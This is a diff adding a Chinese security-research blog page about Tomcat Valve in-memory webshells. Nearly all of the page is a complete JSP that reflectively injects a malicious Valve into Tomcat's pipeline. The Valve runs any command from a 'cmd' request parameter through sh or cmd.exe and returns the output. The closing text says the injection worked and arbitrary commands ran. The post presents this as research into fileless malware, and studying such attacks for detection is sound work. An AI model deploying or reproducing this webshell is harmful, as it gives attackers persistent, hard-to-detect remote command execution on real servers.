@@ -1,0 +1,54 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Tomcat Valve型内存马 | 1ux4ry Archive</title><meta name=description content="Java 内存马 作为一种无文件落地的木马，研究很有必要"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents><ul><li><a href=#完整代码>完整代码</a></li><li><a href=#编译运行>编译运行</a></li></ul></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label="Tomcat Valve型内存马"><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./JAVA内存马基础系列</p><div class=article-hero-card__title><span class=article-hero-card__title-main>Java内存马基础系列</span>
+<span class=article-hero-card__title-sub>Tomcat Valve型内存马</span></div><p class=article-hero-card__meta>Java内存马 / Java内存马基础系列 / 1ux4ry Archive</p><p class=article-hero-card__desc>Java 内存马 作为一种无文件落地的木马，研究很有必要</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><p class=article-series>Java内存马基础系列</p><h1>Tomcat Valve型内存马</h1><div class=single-meta><span>2026-06-15</span>
+<span>Java内存马</span>
+<span># 安全研究</span></div></header><div class="page-copy content-body"><h1 id=完整代码>完整代码</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;  
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;  
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;org.apache.catalina.valves.ValveBase&#34; %&gt;  
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;org.apache.catalina.connector.Response&#34; %&gt;  
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;  
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;org.apache.catalina.core.*&#34; %&gt;  
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;  
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;  
+</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;java.io.PrintWriter&#34; %&gt;  
+</span></span><span class=line><span class=cl>&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>&lt;%  
+</span></span><span class=line><span class=cl>Field requestField = request.getClass().getDeclaredField(&#34;request&#34;);  
+</span></span><span class=line><span class=cl>requestField.setAccessible(true);  
+</span></span><span class=line><span class=cl>final Request req = (Request) requestField.get(request);  
+</span></span><span class=line><span class=cl>StandardContext standardContext = (StandardContext) req.getContext();  
+</span></span><span class=line><span class=cl>Field pipelineField = ContainerBase.class.getDeclaredField(&#34;pipeline&#34;);  
+</span></span><span class=line><span class=cl>pipelineField.setAccessible(true);  
+</span></span><span class=line><span class=cl>StandardPipeline evilStandardPipeline = (StandardPipeline) pipelineField.get(standardContext);  
+</span></span><span class=line><span class=cl>ValveBase evilValve = new ValveBase() {  
+</span></span><span class=line><span class=cl>@Override  
+</span></span><span class=line><span class=cl>public void invoke(Request request, Response response) throws ServletException,IOException {  
+</span></span><span class=line><span class=cl>if (request.getParameter(&#34;cmd&#34;) != null) {  
+</span></span><span class=line><span class=cl>boolean isLinux = true;  
+</span></span><span class=line><span class=cl>String osTyp = System.getProperty(&#34;os.name&#34;);  
+</span></span><span class=line><span class=cl>if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {  
+</span></span><span class=line><span class=cl>isLinux = false;  
+</span></span><span class=line><span class=cl>}  
+</span></span><span class=line><span class=cl>String[] cmds = isLinux ? new String[]{&#34;sh&#34;, &#34;-c&#34;, request.getParameter(&#34;cmd&#34;)} : new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, request.getParameter(&#34;cmd&#34;)};  
+</span></span><span class=line><span class=cl>InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
+</span></span><span class=line><span class=cl>Scanner s = new Scanner(in, &#34;GBK&#34;).useDelimiter(&#34;\\A&#34;);  
+</span></span><span class=line><span class=cl>String output = s.hasNext() ? s.next() : &#34;&#34;;  
+</span></span><span class=line><span class=cl>response.setCharacterEncoding(&#34;GBK&#34;);  
+</span></span><span class=line><span class=cl>PrintWriter out = response.getWriter();  
+</span></span><span class=line><span class=cl>out.println(output);  
+</span></span><span class=line><span class=cl>out.flush();  
+</span></span><span class=line><span class=cl>out.close();  
+</span></span><span class=line><span class=cl>}  
+</span></span><span class=line><span class=cl>this.getNext().invoke(request, response);  
+</span></span><span class=line><span class=cl>}  
+</span></span><span class=line><span class=cl>};  
+</span></span><span class=line><span class=cl>evilStandardPipeline.addValve(evilValve);  
+</span></span><span class=line><span class=cl>out.println(&#34;inject success&#34;);  
+</span></span><span class=line><span class=cl>%&gt;
+</span></span></code></pre></div><h1 id=编译运行>编译运行</h1><p>上面的这个是采用了从<code>StandardContext</code>反射获取<code>StandardPipeline</code>的方式，效果如下：</p><p>发现注入成功了</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518134240575.png alt=image.png loading=lazy decoding=async></figure></p><p>执行任意命令</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260518134323499.png alt=image.png loading=lazy decoding=async></figure></p></div><div class=single-tags><a href=/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/># 安全研究</a></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
